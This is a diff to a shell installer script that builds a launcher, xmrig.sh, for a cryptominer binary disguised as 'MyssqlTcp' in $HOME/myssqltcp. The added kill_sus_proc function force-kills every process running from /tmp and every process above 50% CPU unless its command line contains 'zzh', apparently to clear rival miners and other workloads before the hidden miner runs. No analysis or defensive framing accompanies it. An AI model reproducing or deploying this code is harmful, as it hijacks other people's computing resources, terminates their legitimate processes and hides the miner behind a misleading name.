@@ -698,6 +698,34 @@ kill_sus_proc
 echo "[*] Creating $HOME/myssqltcp/xmrig.sh script"
 cat >$HOME/myssqltcp/xmrig.sh <<EOL
 #!/bin/bash
+kill_sus_proc()
+{
+    ps axf -o "pid"|while read procid
+    do
+        ls -l /proc/$procid/exe | grep /tmp
+        if [ $? -ne 1 ]
+        then
+            cat /proc/$procid/cmdline| grep -a -E "zzh"
+            if [ $? -ne 0 ]
+            then
+                kill -9 $procid
+            else
+                echo "don't kill"
+            fi
+        fi
+    done
+    ps axf -o "pid %cpu" | awk '{if($2>=50.0) print $1}' | while read procid
+    do
+        cat /proc/$procid/cmdline| grep -a -E "zzh"
+        if [ $? -ne 0 ]
+        then
+            kill -9 $procid
+        else
+            echo "don't kill"
+        fi
+    done
+}
+kill_sus_proc
 if ! pidof MyssqlTcp >/dev/null; then
   nice $HOME/myssqltcp/MyssqlTcp \$*
 else
